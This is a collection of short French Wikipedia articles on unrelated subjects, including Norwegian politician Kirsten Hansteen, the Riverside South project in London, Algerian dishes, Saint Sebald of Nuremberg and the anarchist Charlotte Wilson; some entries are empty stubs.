Le village a une population de 670 habitants en 2008.

</doc>
<doc id="7900975" url="https://fr.wikipedia.org/wiki?curid=7900975" title="Kirsten Hansteen">
Kirsten Hansteen

Kirsten Hansteen, née le à Lyngen (Norvège) et morte le , est une femme politique norvégienne membre du Parti communiste.
Elle est la première femme à devenir membre d'un gouvernement norvégien, en tant que ministre consultative au ministère des Affaires sociales, en 1945.
Biographie.
Kirsten Hansteen est née à Lyngen, dans le comté de Troms, en Norvège. Ses parents étaient Ole Christian Strøm Moe (1866-1907) et Gerda Sophie Landmark (1871-1934). Son père meurt alors qu'elle n'a que quatre ans et sa mère déménage avec ses cinq enfants à Kristiania (aujourd'hui Oslo). Elle passe l'examen artium en 1921 et étudie ensuite l'allemand et le norvégien à l'université d'Oslo.
En 1930, elle épouse l'avocat Viggo Hansteen (1900-1941), qui est exécuté en 1941 pendant l'occupation de la Norvège par l'Allemagne nazie. Elle édite le journal de résistance clandestine et féministe "Kvinnefronten" (Le front des femmes) pendant l'occupation allemande.
Après la libération de la Norvège à la fin de la Seconde Guerre mondiale, elle cofonde la revue "Kvinnen og Tiden" avec Henriette Bie Lorentzen (1911-2001). Lorentzen et Hansteen sont corédactrices en chef de cette revue publiée de décembre 1945 à 1955. Kirsten Hansteen est également membre du Parlement norvégien, élue dans le comté d'Akershus, en tant que représentante du Parti communiste norvégien de 1945 à 1949. Entre le 25 juillet et le 5 novembre 1945, elle est ministre consultative au ministère des Affaires sociales, dans le gouvernement du Premier ministre Einar Gerhardsen, ce qui fait d'elle la première femme membre d'un gouvernement en Norvège (la première femme ministre de plein exercice sera Aaslaug Aasland en 1948). 
À partir de 1959, elle travaille à l'université d'Oslo en tant que bibliothécaire, jusqu'à sa retraite en 1970. Elle est décédée le 17 novembre 1974 à Oslo.

</doc>
<doc id="7900980" url="https://fr.wikipedia.org/wiki?curid=7900980" title="Constitution de l’Empire du Japon">
Constitution de l’Empire du Japon



</doc>
<doc id="7900981" url="https://fr.wikipedia.org/wiki?curid=7900981" title="Frank Dikotter">
Frank Dikotter



</doc>
<doc id="7900982" url="https://fr.wikipedia.org/wiki?curid=7900982" title="Projet de développement de Nawara">
Projet de développement de Nawara



</doc>
<doc id="7900984" url="https://fr.wikipedia.org/wiki?curid=7900984" title="Rue René-Siegfried">
Rue René-Siegfried



</doc>
<doc id="7900991" url="https://fr.wikipedia.org/wiki?curid=7900991" title="Jacques-Pierre Bridet">
Jacques-Pierre Bridet

Jacques-Pierre Bridet est un cultivateur français né en 1746 à Louvilliers et décédé à Paris en 1807.
Bridet est l'inventeur en 1785 d'un procédé permettant de convertir les matières fécales en un poudre fertilisante sans odeur (engrais). Cette découverte améliora grandement la salubrité publique.
Il est l'auteur de: "Observations sur le décret du , qui accorde aux habitans des communes la propriété et le partage des biens dits communaux" (1793)

</doc>
<doc id="7900998" url="https://fr.wikipedia.org/wiki?curid=7900998" title="Riverside South (Canary Wharf)">
Riverside South (Canary Wharf)

Riverside-South est dans le quartier du Canary Wharf, à Londres. L'investisseur principal est la banque britannique JP Morgan, qui a acheté un bail de 999 ans sur le site, avec l'intention d'y installer son siège social. Mais l'entreprise a décidé en 2012 de se déplacer dans un bâtiment existant du Canary Wharf, sans connaître la date d'achèvement du projet.
Projet.
La société britannique JP Morgan est à l’origine du projet qui est situé à l'Ouest de l'île aux Chiens, au bord de la Tamise. C'est l'un des rares sites dans la partie occidentale du quartier des docks qui a été identifié comme approprié pour la construction de ce gratte-ciel.
Le projet initial est composé de deux bâtiments de 214 mètres et 189 mètres, conçus par la Richard Rogers Partnership . Le permis de construction a été délivré en 2004.
En , le Canary Wharf Group a présenté une nouvelle demande de permis de construction afin d'augmenter la taille du projet de 36 420 m² à 327 255 m². Les projets initiaux ont été modifiés afin d'augmenter la hauteur de la Tour 1 (de 214 mètres à 235,64 mètres) et de réduire la taille de la Tour 2 (de 189 mètres à 185,84 mètres). Le nouveau projet prévoit également de rehausser le bâtiment central de 25 mètres. Ce projet fut accordé par le London Borough of Tower Hamlets, le . Une nouvelle révision a été soumise en , réduisant finalement la hauteur du bâtiment central de 9 mètres. 
La tour 1 du projet deviendra alors le plus haut bâtiment du Canary Wharf, dépassant le One Canada Square d'un mètre. L'ensemble des bâtiments sera, en termes de surface au sol, parmi les plus grands bureaux en Europe.
Construction.
Début 2007, JP Morgan a annoncé le ralentissement de l'avancée du projet. L'entreprise a en effet décidé de s’implanter davantage dans La City. Mais en , la société a annoncé qu'elle avait finalement signés des accords pour s'installer au Canary Wharf. En , JP Morgan a signé un accord pour l'achat d'un bail de 999 ans pour plus de 280 millions d'euros. 
Canary Wharf Contractors Limited ont été retenus pour construire les fondations et les structures. Les travaux sur la dalle du sous-sol pour la tour 1 ont commencé en . En , JP Morgan a annoncé qu'il allait déménager son personnel londonien en l'adresse du 25 Bank Street, un petit bâtiment dans le quartier du Canary Wharf, qui était autrefois le bureau londonien de la banque Lehman Brothers. En , JP Morgan a annoncé son intention d'achever la construction. Les travaux devaient commencer en pour une durée de plus de 12 mois. Mais en , seuls les travaux de fondation étaient en cours et il est encore difficile de connaître la date exacte de la livraison du projet. 
En septembre 2014, JP Morgan abandonne le développement de Riverside South et met en vente le projet. 

</doc>
<doc id="7900999" url="https://fr.wikipedia.org/wiki?curid=7900999" title="Konstantinos Koukodimos">
Konstantinos Koukodimos



</doc>
<doc id="7901000" url="https://fr.wikipedia.org/wiki?curid=7901000" title="Équipe du Zimbabwe de Coupe Davis">
Équipe du Zimbabwe de Coupe Davis

L'équipe du Zimbabwe de Coupe Davis (ou de Rhodésie avant 1980) représente le Zimbabwe à la Coupe Davis.
Historique.
L'équipe prend part pour la première fois à la Coupe Davis en 1963.
Kevin Ullyett, Byron Black et Wayne Black ont joué dans le Groupe mondial.
En 1998, le Zimbabwe atteint les quarts de finale du Groupe mondial (défaite contre l'Italie 5-0) : c'est sa meilleure performance avec un premier tour en 2000, contre les États-Unis, et plusieurs rencontres de barrages.
Joueurs de l'équipe.
Les joueurs suivants ont été sélectionnés lors de la Coupe Davis 2014 :
Anciens joueurs :

</doc>
<doc id="7901008" url="https://fr.wikipedia.org/wiki?curid=7901008" title="Kaldi">
Kaldi

Les kaldi sont des feuilletés algériens farcis aux tomates et aux oignons.
Description.
Il s'agit d'une entrée, ou d'un encas, très consommée dans les villes du Constantinois, surtout dans les villes de Skikda et d'Annaba.
Il existe plusieurs sortes de "kaldi", comme ceux aux légumes, au fromage, à la viande hachée ou au thon. Ils sont vendus par des marchands ambulants.
Les "kaldi" ou "caldi" sont des chaussons de pâte feuilletée fourrés au fromage (brousse ou bruccio) d'origine maltaise. Dans les rues du Constantinois, les marchands ambulants maltais criaient en italien « "caldi, caldi" » voulant dire « chaud » ("sħun" en maltais).

</doc>
<doc id="7901013" url="https://fr.wikipedia.org/wiki?curid=7901013" title="Semiquinone">
Semiquinone

Une semiquinone résulte formellement de l'addition d'un électron sur une quinone. Il s'agit d'un radical libre très instable résultant ou bien de la perte d'un atome d'hydrogène par déshydrogénation d'une hydroquinone, par exemple de l'ubiquinol, ou bien de l'addition d'un atome d'hydrogène unique sur une quinone&lt;ref name="10.1016/j.freeradbiomed.2010.05.009"&gt;
&lt;/ref&gt;. Une semiquinone se forme comme intermédiaire dans la réduction de la (couramment appelée "ubiquinone") en ubiquinol, qui est sa forme active.

</doc>
<doc id="7901020" url="https://fr.wikipedia.org/wiki?curid=7901020" title="Coupe d'Europe des clubs de basket-ball en fauteuil roulant 2010">
Coupe d'Europe des clubs de basket-ball en fauteuil roulant 2010

La Coupe d'Europe des clubs de basket-ball en fauteuil roulant 2010, ou EuroCup 2010, est la Coupe d'Europe des clubs de basket-ball en fauteuil roulant organisée par l'IWBF Europe.

</doc>
<doc id="7901024" url="https://fr.wikipedia.org/wiki?curid=7901024" title="Dakshineswar">
Dakshineswar

Dakshineswar (en Bengali : দক্ষিনেশ্বর) est une municipalité sise au bord du Hooghly (rive gauche) à une trentaine de kilomètres au nord de Calcutta (Inde). Elle fait partie de la municipalité de Kamarhati, dans le district de North 24 Parganas. La ville est surtout connue pour son temple de Kali que Ramakrishna, prêtre hindou le desservant et célèbre mystique du , rendit célèbre.
Temple de Dakshineswar.
Le le nouveau temple à la déesse Kali, construit par (1793-1861) est inauguré et ouvert au culte à l'occasion de la fête hindoue de Snanyatra. La fête, entièrement financée par Rani Rashmoni, fut grandiose. Des brahmanes invités pour l’occasion vinrent de Kanauj, Chattagram, Odisha et Navadwip. Chacun d'eux reçut un vêtement en soie et une pièce d'or. Des milliers de personnes assistèrent au spectacle de l’inauguration. 
Le plus célèbre prêtre au service du temple fut Ramakrishna Paramahamsa (1836-1886), choisi par Rani Rashmoni elle-même, est un brahmane Bengali de la seconde moitié du . Profondément religieux et ascète exigeant Il est considéré comme ‘saint’ dans la tradition hindoue et même comme une [incarnation divine par certains. Sans être intellectuel lui-même il eut une grande influence sur les milieux aristocratiques et intellectuels hindous de la ville de Calcutta toute proche, alors brillante capitale de l’empire anglais des Indes.
Autour de Ramakrishna se forma un cercle de réformateurs religieux hindous, qui sont à l’origine du nationalisme Bengali, un mouvement qui se répandra dans toute l’Inde. Parmi eux, son plus célèbre disciple, Vivekananda, de la culture védique, est le fondateur, en 1897, d’un groupe moderne de moines missionnaires hindous : la ‘"Mission de Ramakrishna"’, dont le quartier général se trouve exactement de l’autre côté du fleuve Hooghly, à Belur Math. Ainsi Dakshineswar peut être considéré comme un important lieu d'origine de la renaissance religieuse hindoue.

</doc>
<doc id="7901025" url="https://fr.wikipedia.org/wiki?curid=7901025" title="Trou souffleur littoral">
Trou souffleur littoral



</doc>
<doc id="7901033" url="https://fr.wikipedia.org/wiki?curid=7901033" title="Sbiaat laaroussa">
Sbiaat laaroussa

Le sbiaat laaroussa, ou sebiâat leârossa (en arabe : صبيعات لعروسة ) ou encore sbâa leârossa (en arabe : صبع لعروسة ) est un beignet traditionnel algérien, frit et enrobé de sucre glace, sucre cristallisé et même de noix de coco. Il peut aussi être arrosé de miel. Il est généralement servi avec un café ou un thé.
Origine et étymologie.
Cette pâtisserie est originaire de la ville d'Alger. Son nom provient de l'arabe algérien, "sebiâat leârossa", qui signifie littéralement « les doigts de la mariée », de par sa forme qui ressemble à des doigts, mais aussi parce que, à l'époque, cette pâtisserie était le premier gâteau que devait confectionner la nouvelle mariée.

</doc>
<doc id="7901035" url="https://fr.wikipedia.org/wiki?curid=7901035" title="Terminologie de l'athlétisme">
Terminologie de l'athlétisme



</doc>
<doc id="7901040" url="https://fr.wikipedia.org/wiki?curid=7901040" title="Christine Revault d'Allonnes-Bonnefoy">
Christine Revault d'Allonnes-Bonnefoy

Christine Revault d'Allonnes-Bonnefoy, née le à Châteauroux, est une femme politique française. Membre du Parti socialiste (PS), elle est députée européenne de 2014 à 2019, et préside la délégation socialiste française au Parlement européen de 2017 à 2019.
Biographie.
Débuts en politique au Parti socialiste.
Diplômée d’un DEA de sociologie politique de l'Université Paris 1 Panthéon-Sorbonne, Christine Revault d'Allonnes rentre en 1995 au Parti socialiste, intégrant en 1995 le service de presse de Lionel Jospin lors de la campagne présidentielle. Attachée parlementaire au Sénat, elle travaille auprès de Monique Cerisier-ben Guiga jusque 2011, puis auprès de Jean-Yves Leconte jusque 2014.
Secrétaire de la section du Parti socialiste de Villejuif pendant , elle est membre des instances nationales du Parti socialiste depuis 2000, et membre du Conseil national depuis 2003. Candidate aux élections cantonales de Villejuif en 1998 et en 2004, elle est tête du liste du Parti socialiste à Villejuif lors des élections municipales 2001. Elle devient alors maire adjointe chargée de la politique éducative jusqu'à son élection en 2004 comme conseillère régionale d'Île-de-France. Elle reste conseillère municipale de Villejuif jusqu'en 2014, et préside le groupe socialiste à la communauté d'agglomération de Val de Bièvre. Elle est réélue conseillère régionale d'Île-de-France en mars 2010. 
Après avoir été Secrétaire nationale adjointe chargée des élections de 2012 à 2014, elle devient Secrétaire nationale chargée du suivi de l'opinion depuis avril 2014. À partir de juillet 2011, elle fait partie du pôle Transports de l'équipe de campagne de François Hollande sur les questions de gouvernance. 
Elle est suppléante du député Jean-Yves Le Bouillonnec de 2002 à 2017. 
Députée européenne de 2014 à 2019.
En juin 2009, elle prend la place sur la liste du parti socialiste pour l'Île-de-France pour les élections européennes. En avril 2014, à la suite de la nomination d'Harlem Désir et de démissions en chaîne sur la liste socialiste en Île-de-France pour les élections européennes — Benoît Hamon, ministre, ne peut siéger, et Monique Saliou ne souhaite pas siéger — elle devient députée européenne.
Elle est candidate à sa réélection lors des élections européennes de 2014 qui ont lieu un peu plus d'un mois plus tard. Elle figure en troisième position sur la liste socialiste en Île-de-France, et est réélue le 25 mai 2014.
Positionnement politique au sein du PS.
Elle est chargée du projet Transports, Mer et Pêche dans la campagne de Vincent Peillon pour la primaire citoyenne de 2017. Elle est également membre de son comité politique de campagne. Après la victoire de Benoît Hamon à la primaire citoyenne de 2017, elle est nommée responsable thématique « Transports » de sa campagne présidentielle. En juillet 2017, elle intègre la direction collégiale du PS. Elle soutient la candidature d'Olivier Faure au poste de premier secrétaire du Parti socialiste pour le congrès du parti qui a lieu début 2018, et lors duquel il est élu.
Activité parlementaires.
Elle siège dans les commissions Transports et Tourisme (TRAN) du Parlement européen et Libertés civiles, sécurité intérieure et Justice (LIBE). À la suite du scandale de l'affaire Volkswagen qui a éclaté aux États-Unis en septembre 2015, elle siège dans la commission d'enquête sur les mesures des émissions polluantes dans le secteur automobiles (EMIS) en qualité de rapporteur pour le groupe des Socialistes et démocrates. Elle est aussi membre de la Délégation pour les relations avec l'Afrique du Sud et la Délégation des relations avec le Mercosur. Dans ce cadre, elle prend position contre l'Accord économique et commercial global (CETA). 
En , elle devient présidente de la délégation socialiste des socialistes français au Parlement européen.
Fin 2019, elle rejoint Tilder, cabinet de conseil en affaires publiques et en lobbying, en tant que directrice associée et directrice de cabinet du président, Matthias Leridon. 

</doc>
<doc id="7901048" url="https://fr.wikipedia.org/wiki?curid=7901048" title="Saint-Sébald de Nuremberg">
Saint-Sébald de Nuremberg



</doc>
<doc id="7901049" url="https://fr.wikipedia.org/wiki?curid=7901049" title="Roman érotique">
Roman érotique



</doc>
<doc id="7901052" url="https://fr.wikipedia.org/wiki?curid=7901052" title="Équipe d'Indonésie de Coupe Davis">
Équipe d'Indonésie de Coupe Davis

L'équipe d'Indonésie de Coupe Davis représente l'Indonésie à la Coupe Davis.
Historique.
L'équipe prit part pour la première fois à la Coupe Davis en 1961. 
Elle a atteint à deux reprises le groupe mondial : 
Joueurs de l'équipe.
Les joueurs suivants ont été sélectionnés lors de la Coupe Davis 2015 :

</doc>
<doc id="7901053" url="https://fr.wikipedia.org/wiki?curid=7901053" title="Emilie Raffoul-Rouleau">
Emilie Raffoul-Rouleau



</doc>
<doc id="7901055" url="https://fr.wikipedia.org/wiki?curid=7901055" title="Phubber">
Phubber



</doc>
<doc id="7901056" url="https://fr.wikipedia.org/wiki?curid=7901056" title="Marcel Vacherot">
Marcel Vacherot

Marcel Gustave Arsène Vacherot, né le à Neuilly-sur-Seine et mort le à Pau est un joueur de tennis français actif au début du siècle.
Biographie.
Marcel Vacherot est le fils d'Arsène Vacherot, maître des requêtes au Conseil d'État et petit-fils du philosophe et député Étienne Vacherot. Son grand frère André Vacherot a été quatre fois champion de France. Agent de change de profession, il se marie en 1910 avec Mlle Claire Sabourdin, fille d'un négociant.
Il remporte en 1896 le championnat interscolaire de l'USFSA en double associé à Pierre Gautier et en simple, pour le Lycée Michelet, finales jouées respectivement le au Cercle de Puteaux et au Racing Club de France. Il remporte à nouveau ce tournoi en , après être sorti vainqueur de Decugis en finale.
Avec son frère comme partenaire de double, il a remporté en 1901 au cours d'une tournée en Suisse trois tournois à Maloja, Saint-Moritz et Lucerne. En 1902, il devient Champion de France face à Max Decugis.
Palmarès.
Titres.
Championnat de France :

</doc>
<doc id="7901057" url="https://fr.wikipedia.org/wiki?curid=7901057" title="Sébald de Nuremberg">
Sébald de Nuremberg

Sébald de Nuremberg (ou Sinibald, ou Sebald) est vénéré comme saint patron de la ville de Nuremberg. Il était le garant de son indépendance comme ville libre d'Empire. D'après la légende, Sébald était un ermite et un missionnaire. 
La plupart des détails de sa vie sont incertains. On sait qu'il a vécu dans la région de Nuremberg dans la première moitié du , qu'il y est mort et enterré. Son nom apparaît pour la première fois en 1070. Vénéré depuis le milieu du à Nuremberg, il est canonisé par le pape Martin V en 1425, sur demande insistante de la municipalité de Nuremberg. En 1429, des florins de Nuremberg à son effigie commencent à circuler, appelés "Sebaldusgulden". Il est fêté le 19 août. Il est représenté comme pèlerin, avec le bâton et le chapeau spécifiques, parfois orné de la coquille Saint-Jacques, un Rosaire à la main et portant son église sur le bras. De nombreuses légendes entourent sa vie, et il est crédité de divers miracles et guérisons.
Hagiographie.
Une des premières légendes, datant d'environ 1280, affirme que Sébald est contemporain de Henri III du Saint-Empire (mort en 1056) et qu'il est originaire de Franconie. Après un pèlerinage en Italie, il devient prédicateur à Nuremberg. 
D'après une autre source, il serait un noble de Franconie qui aurait rencontré Willibald, son frère Winibald et leurs sœur Walburge en Italie (mais ceci ferait remonter sa vie au ) et serait devenu missionnaire dans la forêt de Nuremberg, le qui était propriété de la ville libre de Nuremberg. 
D'autres légendes en font le fils du roi du Danemark qui, encore étudiant à Paris, aurait épousé une princesse française, mais l’aurait abandonnée durant leur nuit de noces pour partir en pèlerinage à Rome. Une autre version, encore répandue au , fait de sa mère la fille d'un roi français. Une gravure d'Albrecht Dürer datée de 1501 montre Sébald sur un piédestal, surmonté des blasons des maisons royales du Danemark et de la France. Ces variantes de légendes ont en commun que le pape investit Sébald de la mission d'évangéliser dans les forêts de Nuremberg, ce qui donne à sa présence une autorité et bénédiction papale.
Le nom "Sebaldus" usuel en allemand est lui-même une forme latinisée tardive du prénom allemand "Siegbald" (composé du vieil allemand "sigu"= victoire et "bald"=audacieux). On trouve, à côté de Sebaldus, aussi "Sigibaldus" ou "Sigisbaldus". Ainsi l'évêque de Metz fondateur du monastère de Saint-Avold, s'appelait Sigisbald. D'après Erffa, on trouve en Italie le nom "Sinibaldus". Le père de sainte Rosalie, patronne de Palerme, s'appelait "Sinibald"; plusieurs évêques du au s'appellent "Sinibaldus".
Au , la municipalité de Nuremberg demande à , un moine bénédictin itinérant renommé, de rédiger une " Vita Sancti Sebaldi" (« Vie de saint Sébald »). Il s'agit de mettre en ordre les diverses légendes contradictoires, et de rendre crédible (notamment auprès de l'archevêché de Bamberg un peu méprisant) l'engouement pour saint Sébald qui continue à contribuer à la renommée et à l’économie de la ville. Meisterlin rédige deux versons de la "Vita", une première en 1484, une deuxième en 1488. Dans la première version, plus austère, Meisterlin omet les variantes de légendes trop en contradiction avec d'autres et réduit considérablement les miracles accomplis. De plus, il met en parallèle des épisodes de la vie de Sébald avec des épisodes semblables de la Bible, donnant ainsi un air plus savant à sa "Vita". La version révisée fait marche arrière, probablement parce que les notables ont trouvé le texte « trop abstrait et trop peu politique ». Des faits écartés dans la première version réapparaissent et l'importance de la ville de Nuremberg est mis en avant; en particulier, il fait remonter la fondation de la ville jusqu'à la chute de l'Empire romain.
Vénération.
Malgré ses origines obscures et l'historicité incertaine du saint lui-même, le culte de Sébald a longtemps été associé à Nuremberg, favorisé par la ville elle-même qui devient un lieu de pèlerinage. L'existence du culte peut être retracée jusqu'à la fin du , une référence y est faite pour l'année 1072 dans la chronique de l'abbé Lambert de Hersfeld qui mentionne des guérisons miraculeuses. À cette époque, les restes de Sébald reposent probablement dans une petite chapelle dédiée à saint Pierre qui existait avant la nouvelle église. Il est admis que la tombe miraculeuse de Sébald a contribué aux premiers développements de la ville. En 1255 il devient le patron, avec l'apôtre Pierre, de l'église paroissiale nouvellement reconstruite, où son tombeau est vénéré.
La date du 19 août comme jour de fête de saint Sébald apparaît dans un calendrier de la ville d'Olomouc de 1137, et de nombreux enfants nés à Nuremberg portent les noms du saint. Les reliques du saint sont translatées en 1397 dans le nouveau chœur de l'église Saint-Sébald, et chaque année ses reliques sont portées en procession. Les rois et empereurs, lors d'un séjour dans la ville, ont l'habitude de venir prier devant son reliquaire.
Le 26 mars 1425 Sébald est formellement canonisé par le pape Martin V, à la faveur d'une requête du conseil de la ville de Nuremberg. En 1429, des florins de Nuremberg commencent à porter son effigie. Le culte a survécu à la réforme protestante.
Représentations.
En 1508-1519, Peter Vischer l'Ancien et ses fils construisent le célèbre monument funéraire en bronze, de style gothique tardif, qui est installé dans l'église Saint-Sébald; ce tombeau est un chef-d'œuvre de la Renaissance allemande. 
Sébald étant un saint à portée locale, il est d'autant plus surprenant qu'il a fait l'objet de représentations iconographiques en Italie, recensées par Hans Martin von Erffa. Un volet d'orgue au nom de "San Sinibaldo" se trouve dans l'église San Bartolomeo de Venise. C'est une œuvre de jeunesse Sebastiano del Piombo en date de 1507. Le fait que l’artiste ait jugé nécessaire d'identifier le saint représenté par une petite pancarte évoquant peut-être une ville du Nord suggère que Sébald n'était pas largement connu à Venise. L'autre des deux panneaux représente saint Louis de Toulouse. De fait, ce tableau est un don des marchands de Nuremberg. L'église San Bartolomeo était l'église paroissiale des marchands allemands, qui devaient alors habiter à la "Fondaco dei Tedeschi" à proximité. Une fondation assurait les services dans l'église. À l'époque du panneau, deux familles patriciennes de Nuremberg avaient des représentants aux responsabilités à Venise, les Imhoff et les Tucher.
Un autre tableau connu est la "Pietà Serristori" du "Maestro dell'Osservanza" (le Maître de l'Observance), datant de 1432-1433, anciennement dans la collection du comte Serristori et maintenant au Monte dei Paschi di Siena, représentant également le donateur Peter Volckamer et Sébald. Le donateur, aux cheveux blancs, vêtu à la bourgeoise, fait partie d'une famille patricienne de Nuremberg, ultérieurement , et Peter lui-même a occupé une place importante dans la haute administration. Le tableau comporte en bas deux blasons de la famille Volckamer qui sont des copies fidèles, aux couleurs près. Au fond à droite et debout saint Sébald, portant le bâton de pèlerin et le rosaire d'une main, le modèle de son église de l'autre, dont le visage a une ressemblance frappante avec celui du donateur présumé. Au pied du modèle est inscrit "Sibaldus". En fait, Peter Volckhamer, au service de l'empereur Sigismond, est mort à Sienne le 5 septembre 1432, et le tableau est probablement une épitaphe comportant le blason de Peter et peut-être celui d'un fils venu exprès. Les blasons ne comportent pas de couronne, insigne attribué à la famille le 6 novembre 1433 par l'empereur, ce qui une date "ante que" pour l'œuvre.
Un dessin de Hans Sebald Beham, datant de 1521 environ, représente Sébald portant son église; dessin conservé dans la Collection Rosenwald de la National Gallery of Art. 
Plus connues sont des gravures d'Albrecht Dürer, une première de 1501, montrant Sébald sur un piédestal, l'autre entre 1518 et 1520, qui représente Sébald dans une niche, avec les armes de la ville de Nuremberg. 
Un tableau de saint Sébald fait partie d'une paire dont l'autre moitié représente saint Laurent, l'autre patron de la ville; ce tableau est dans l'église Saint-Jean, sur le maître-autel.

</doc>
<doc id="7901067" url="https://fr.wikipedia.org/wiki?curid=7901067" title="Milo Moiré">
Milo Moiré

Sue Pruzina, dite Milo Moiré, est une artiste et modèle suisse. Performeuse, actrice porno et peintre, elle utilise souvent sa propre nudité dans ses œuvres et dans celles d’autres artistes.
Biographie.
Née en Suisse le 1983, d'origine slovaque et espagnole, Milo Moiré est diplômée en psychologie à l’Université de Berne et vit et travaille à Düsseldorf, en Allemagne, avec son compagnon et agent, le photographe allemand Peter H. Hergarten (alias Peter Palm), dont elle est aussi muse et modèle.
Durant l'été 2017 elle participe à la saison de l'émission allemande "Promi Big Brother", lors de laquelle elle termine deuxième.
Démarche artistique.
Milo Moiré se place délibérément à la frontière entre l'art et la pornographie, avec des vidéos sur son site web décrites comme « non censurées » et accessibles moyennant paiement, et des performances dénudées invitant à l'acte de censure de la part des médias. Elle déclare qu'il ne devrait y avoir aucune limite à l'art et que la mort est la seule limite qu'elle accepte. Elle cite Marina Abramović et Joseph Beuys comme influences particulières.
Polémiques.
En 2015, Milo Moiré est arrêtée par la police française et passe la nuit en cellule après avoir pris des « selfies » nus avec des touristes devant la Tour Eiffel . L'année suivante, elle est de nouveau arrêtée à Londres lors de sa performance "Mirror Box" pour avoir invité des inconnus, hommes et femmes (majeurs) à placer leurs mains dans une boîte faite de miroirs autour de son corps et à caresser pendant 30 secondes ses seins ou sa vulve.
En juin 2017, elle est agressée et blessée dans une bagarre dans un club de Düsseldorf. 

</doc>
<doc id="7901069" url="https://fr.wikipedia.org/wiki?curid=7901069" title="Mghellef fi ghlâfou">
Mghellef fi ghlâfou

Le mghellef fi ghlâfou' est une entrée traditionnelle algérienne"."
Origine et étymologie.
L'origine de cette entrée est algéroise. Quant à son nom, il provient de l'arabe algérien signifiant .
Description.
Cette entrée est faite de cigares de feuille de brick, fourrés d'une farce à la viande hachée, d'œufs, d'oignons et parfumés à la cannelle. Ces cigares sont ensuite arrosés d'une sauce épicée aux pois chiches.

</doc>
<doc id="7901075" url="https://fr.wikipedia.org/wiki?curid=7901075" title="Timor panicus">
Timor panicus

Timor panicus, expression latine signifiant « peur panique », est un « effroi sacré » ou une « panique divine », une peur concomitante d'un événement surnaturel réel ou supposé. Elle est à rapprocher de l'influence qu'avait sur la nature et sur les hommes le dieu Pan de la mythologie grecque, dont le nom est étymologiquement à l'origine du mot « panique ».
Illustration.
Dans "Le Roi du monde", René Guénon observe que Saint-Yves d'Alveydre et Ferdynand Ossendowski, dans leurs descriptions de l'Agarttha parlent de . Précisant en note la similitude avec le « "Timor panicus" des anciens ».

</doc>
<doc id="7901078" url="https://fr.wikipedia.org/wiki?curid=7901078" title="Haksan">
Haksan



</doc>
<doc id="7901080" url="https://fr.wikipedia.org/wiki?curid=7901080" title="Skikrate">
Skikrate

Le skikrate est une pâtisserie traditionnelle algérienne sans cuisson, composée de noix de coco, sucre glace et beurre, et fourrée avec une farce à base de gâteaux secs et confiture.
Les "skikrate" sont en forme de losange et très colorés. 

</doc>
<doc id="7901082" url="https://fr.wikipedia.org/wiki?curid=7901082" title="Medi1TV">
Medi1TV



</doc>
<doc id="7901085" url="https://fr.wikipedia.org/wiki?curid=7901085" title="Charlotte Wilson">
Charlotte Wilson

Charlotte Mary Wilson, née Charlotte Mary Martin, le à Kemerton (Worcestershire) et morte le à Irvington-on-Hudson (New York), est une anarchiste socialiste et féministe britannique. Elle est cofondatrice du journal "Freedom" en 1886 Fabian Women's Group en 1908.
Biographie.
Charlotte Wilson est la fille unique de Robert Spencer Martin, médecin, et de son épouse Clementina Susannah, née Davies. Elle fait ses études universitaires au Cheltenham Ladies' College, puis à Merton Hall, Cambridge de 1873 à 1876.
En 1876, elle épouse le financier Arthur Wilson et elle s'installe à Londres où elle rejoint la Fabian Society. Elle est élue membre du comité exécutif de la société fabienne en 1884. C'est aussi le début d'une longue correspondance, tenue jusqu'à 1896, avec Karl Pearson.
En même temps, elle fonde le , aussi connu sous le nom de Société Karl Marx ou Société Proudhon. Le groupe se rassemble à Hampstead Heath, dans son ancienne maison. Aucune trace écrite du club ne subsiste, en dehors de références par plusieurs participants dont les mémoires ont été publiés. Wilson note cependant une longue liste de personnes fréquentant le club, dont la secrétaire est ; la liste inclut Sidney Webb, George Bernard Shaw, Sydney Olivier, Annie Besant, Graham Wallas, Belfort Bax, Edward Pease, Hubert Bland, Edith Nesbit, Havelock Ellis, Edward Carpenter, Frank Podmore, Ford Madox Brown et Olive Schreiner.
Le club étudie d'abord "Le Capital", lu en français par une participante russe, puis se penche sur les écrits de Pierre-Joseph Proudhon. En 1889, George Bernard Shaw décrit des débats enflammés au sein du club. La Fabian Society et le sont deux groupes séparés, bien qu'ils aient de nombreux membres en commun, et Shaw décrit les réunions organisées par Wilson comme le lieu de naissance du socialisme de classe moyenne. Elle co-fonde également un groupe de réflexion avec Sergueï Stepniak-Kravtchinski, Karl Pearson et Wilfrid M. Voynich, qui deviendra en 1890 la .
En mars 1886, elle invite Pierre Kropotkine à s’établir près de Londres. Kropotkine et Wilson rejoignent le petit groupe du journal "The Anarchist", animé par l’individualiste libertaire Henry Seymour, mais s’en séparent rapidement. En octobre de la même année, elle fonde avec Pierre Kropotkine le journal communiste libertaire "Freedom" autour duquel se constitue un "Freedom Group", qu'elle animera jusqu'en 1895. Le journal partage la presse de William Morris avec le journal "".
En 1886, William Morris et elle s'opposent à la transformation de la Fabian Society en parti politique, mais n'obtiennent pas gain de cause, et elle quitte la Society en avril 1887 pour rejoindre la faction anarchiste associée.
Le , à Bloody Sunday, elle prononce un discours à Trafalgar Square et participe aux manifestations.
En 1888, elle écrit et publie l'ouvrage "Work," longtemps attribué à tort à Kropotkine.
Au début du vingtième siècle, elle prend de la distance des mouvements anarchistes, sans les critiquer publiquement. Elle réintègre la Fabian Society en 1907 et participe à la fondation du Fabian Women's Group avec Maud Pember Reeves en 1908, où elle soutient les revendications des suffragettes. Elle est secrétaire générale et gestionnaire du sous-comité des études du Fabian Women's Group de 1908 à 1913, où elle pousse le groupe à étudier les conditions de travail des femmes. De 1911 à 1914, elle réintègre également le comité de direction de la Fabian Society.
Postérité.
Elle sert de modèle au personnage de Gemma dans le roman "Le Taon" d'Ethel Lilian Voynich. Edith Nesbit décrit la maison qui accueille le dans son autobiographie.
En 2000, Nicolas Walter édite une collection de ses essais chez Freedom Press.

</doc>
<doc id="7901090" url="https://fr.wikipedia.org/wiki?curid=7901090" title="Université Momoyama Gakuin">
Université Momoyama Gakuin

L', aussi connue sous le nom de Saint Andrew's University, est une université privée japonaise dont le campus est situé à Izumi, dans la préfecture d'Osaka.

</doc>
<doc id="7901093" url="https://fr.wikipedia.org/wiki?curid=7901093" title="Mdecha">
Mdecha

La mdecha est une soupe traditionnelle algérienne très parfumée, à la menthe pouliot, à l'ail, au carvi et au paprika.
Elle se prépare avec de la semoule.

</doc>
<doc id="7901101" url="https://fr.wikipedia.org/wiki?curid=7901101" title="Organix (album)">
Organix (album)



</doc>
